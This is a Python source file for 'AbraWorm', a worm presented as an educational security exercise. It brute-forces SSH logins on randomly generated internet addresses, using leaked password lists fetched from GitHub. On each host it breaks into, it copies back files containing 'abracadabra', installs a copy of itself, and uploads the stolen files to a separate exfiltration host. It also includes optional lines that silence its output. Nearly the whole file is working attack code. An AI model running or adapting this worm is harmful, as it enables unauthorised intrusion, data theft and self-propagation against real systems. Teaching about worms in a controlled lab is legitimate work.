#!/usr/bin/env python

### AbraWorm.py

### Author: Avi kak (kak@purdue.edu)
### Date:   April 8, 2016

##  This is a harmless worm meant for educational purposes only.  It can
##  only attack machines that run SSH servers and those too only under 
##  very special conditions that are described below. Its primary features 
##  are:
##
##  -- It tries to break in with SSH login into a randomly selected set of
##     hosts with a randomly selected set of usernames and with a randomly
##     chosen set of passwords. 
##
##  -- If it can break into a host, it looks for the files that contain the
##     string `abracadabra'.  It downloads such files into the host where
##     the worm resides.
##
##  -- It uploads the files thus exfiltrated from an infected machine to a
##     designated host in the internet. You'd need to supply the IP address
##     and login credentials at the location marked yyy.yyy.yyy.yyy in the
##     code for this feature to work.  The exfiltrated files would be 
##     uploaded to the host at yyy.yyy.yyy.yyy. If you don't supply this
##     information, the worm will still work, but now the files exfiltrated
##     from the infected machines will stay at the host where the worm
##     resides.  For an actual worm, the host selected for yyy.yyy.yyy.yyy
##     would be a previosly infected host.
##
##  -- It installs a copy of itself on the remote host that it successfully
##     breaks into.  If a user on that machine executes the file thus
##     installed (say by clicking on it), the worm activates itself on
##     that host.
##
##  -- Once the worm is launched in an infected host, it runs in an
##     infinite loop, looking for vulnerable hosts in the internet.  By
##     vulnerable I mean the hosts for which it can successfully guess at
##     least one username and the corresponding password.
##
##  -- IMPORTANT: After the worm has landed in a remote host, the worm can
##     be activated on that machine only if Python is installed on that
##     machine.  Another condition that must hold at the remote machine is
##     that it must have the Python modules paramiko and scp installed.
##
##  -- The username and password construction strategies used in the worm
##     are highly unlikely to result in actual usernames and actual 
##     passwords anywhere.  (However, for demonstrating the worm code in
##     an educational program, this part of the code can be replaced with
##     a more potent algorithm.)
##
##  -- Given all of the conditions I have listed above for this worm to
##     propagate into the internet, we can be quite certain that it is not
##     going to cause any harm.  Nonetheless, the worm should prove useful
##     as an educational exercise.
##
##
##  If you want to play with the worm, run it first in the `debug' mode. 
##  For the debug mode of execution, you would need to supply the following
##  information to the worm:
##
##  1)   Change to 1 the value of the variable $debug.  
##
##  2)   Provide an IP address and the login credentials for a host that you
##       have access to and that contains one or more documents that
##       include the string "abracadabra".  This information needs to go
##       where you see xxx.xxx.xxx.xxx in the code.
##
##  3)   Provide an IP address and the login credentials for a host that 
##       will serve as the destination for the files exfiltrated from the
##       successfully infected hosts. The IP address and the login 
##       credentials go where you find the string yyy.yyy.yyy.yyy in the 
##       code.
##
##  After you have executed the worm code, you will notice that a copy of
##  the worm has landed at the host at the IP address you used for
##  xxx.xxx.xxx.xxx and you'll see a new directory at the host you used for
##  yyy.yyy.yyy.yyy.  This directory will contain those files from the
##  xxx.xxx.xxx.xxx host that contained the string `abracadabra'.

import sys
import os
import random
import paramiko
import scp
import select
import signal
import requests
import time

users = None
passwords = None


##   You would want to uncomment the following two lines for the worm to 
##   work silently:
#sys.stdout = open(os.devnull, 'w')
#sys.stderr = open(os.devnull, 'w')

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1      # IMPORTANT:  Before changing this setting, read the last
               #             paragraph of the main comment block above. As
               #             mentioned there, you need to provide two IP
               #             addresses in order to run this code in debug 
               #             mode. 

##  The following numbers do NOT mean that the worm will attack only 3
##  hosts for 3 different usernames and 3 different passwords.  Since the
##  worm operates in an infinite loop, at each iteration, it generates a
##  fresh batch of hosts, usernames, and passwords.
NHOSTS = NUSERNAMES = NPASSWDS = 3

def get_password_list():
    if debug == 1: return ['password', 'adjfhfad', 'idhf', 'dhf931f']
    r = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt')
    return r.text.split('\n')

def get_user_list():
    if debug == 1: return ['test', 'user', 'mario', 'matteo']
    r = requests.get('https://raw.githubusercontent.com/jeanphorn/wordlist/master/usernames.txt')
    return r.text.split("\n")

def get_new_usernames(how_many):
    global users
    if debug == 1: return ["admin", "account", "vagrant", "kali", "user", "adaliah", "adversary"]
    if how_many == 0: return 0
    users = users if users else get_user_list()
    return random.sample(users,how_many)

def get_new_passwds(how_many):
    global passwords
    if how_many == 0: return 0
    passwords = passwords if passwords else get_password_list()
    if debug == 1: return passwords[:100]
    return random.sample(passwords,how_many)

def get_fresh_ipaddresses(how_many):
    if debug == 1: return ["127.0.0.1"]
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 

def run_ssh_command(ssh, cmd):

    _, stdout_, stderr_ = ssh.exec_command(cmd)

    stdout_.channel.recv_exit_status()
    stderr_.channel.recv_exit_status()

    out = stdout_.readlines()
    err = stderr_.readlines()

    if debug == 1:
        print(f'\tstdout:{out}')
        if len(stderr_.readlines()) > 0: 
            print(f'\tstderr:{err}')
            return []

    return out

# For the same IP address, we do not want to loop through multiple user 
# names and passwords consecutively since we do not want to be quarantined 
# by a tool like DenyHosts at the other end.  So let's reverse the order 
# of looping.
def main():
    while True:
        usernames = get_new_usernames(NUSERNAMES)
        passwds =   get_new_passwds(NPASSWDS)
        #    print("usernames: %s" % str(usernames))
        #    print("passwords: %s" % str(passwds))
            # First loop over passwords
        for passwd in passwds:
            # Then loop over user names
            for user in usernames:
                # And, finally, loop over randomly chosen IP addresses
                for ip_address in get_fresh_ipaddresses(NHOSTS):
                    host = f'{user}@{ip_address}'
                    print(f'{host} -> {passwd}')
                    files_of_interest_at_target = []
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                        print(f'Connected {user}@{ip_address} -> {passwd}')
    
                        # Let's make sure that the target host was not previously 
                        # infected:
                        received_list = None
                        cmd = 'ls'
                        print(f'[{host}] executing: {cmd}')
                        received_list = run_ssh_command(ssh, cmd)
                        
                        if not received_list:
                            next
                        
                        print(f'Checking if target is already infected')
                        if debug == 1: time.sleep(5)
                        if ''.join(received_list).find('AbraWorm') >= 0: 
                            print(f'{host} already infected, found AbraWorm in {received_list}')   
                            next
                        else:
                            print(f'{host} not infected')
    
                        # Now let's look for files that contain the string 'abracadabra'
                        cmd = 'grep -ls abracadabra *'
                        print(f'Checking for interesting files')
                        print(f'[{host}] executing: {cmd}')
                        if debug == 1: time.sleep(5)
                        received_list = run_ssh_command(ssh, cmd)
    
                        if not received_list:
                            next
    
                        for item in received_list:
                            files_of_interest_at_target.append(item.strip())
                        print(f'Files of interest at the target: {files_of_interest_at_target}')
                        if debug == 1: time.sleep(5)
    
                        scpcon = scp.SCPClient(ssh.get_transport())
                        if len(files_of_interest_at_target) > 0:
                            for target_file in files_of_interest_at_target:
                                print(f'[DEBUG] Copy file {target_file}')
                                if debug == 1: time.sleep(5)
                                scpcon.get(target_file)
    
                        # Now deposit a copy of AbraWorm.py at the target host:
                        print(f'[DEBUG] Copy AbraWorm in target')
                        scpcon.put(sys.argv[0])        
                        scpcon.close()
                        if debug == 1: time.sleep(5)

                        print(f'[DEBUG] Cheking {host} for worm deploy, executing: {cmd}')
                        received_list = run_ssh_command(ssh, cmd)
                        print(f'{received_list}')
                        if debug == 1: time.sleep(5)

                    except Exception as e:
                        print(f'Exception catched: {e}')
                        next
    
                    # Now upload the exfiltrated files to a specially designated host,
                    # which can be a previously infected host.  The worm will only 
                    # use those previously infected hosts as destinations for 
                    # exfiltrated files if it was able to send the login credentials
                    # used on those hosts to its human masters through, say, a 
                    # secret IRC channel. (See Lecture 29 on IRC)
                    if len(files_of_interest_at_target) > 0:
                        print(f'Will now try to exfiltrate the files')
                        if debug == 1: time.sleep(5)
                        try:
                            ssh = paramiko.SSHClient()
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            
                            #  For exfiltration demo to work, you must provide an IP address and the login 
                            #  credentials in the next statement:
                            ssh.connect('127.0.0.1',port=12345,username='seed',password='dees',timeout=5)
                            scpcon = scp.SCPClient(ssh.get_transport())
                            print(f'Connected to exhiltration host')
    
                            for filename in files_of_interest_at_target:
                                scpcon.put(filename)
                            scpcon.close()

                            if debug == 1: time.sleep(5)
                            print(f'Summary')
                            print(f'Extracting file:')
                            for filename in files_of_interest_at_target:
                                print(f'- {filename}')


                        except: 
                            print("No uploading of exfiltrated files\n")
                            next

                        if debug == 1:
                            return


if __name__ == "__main__":
    main()
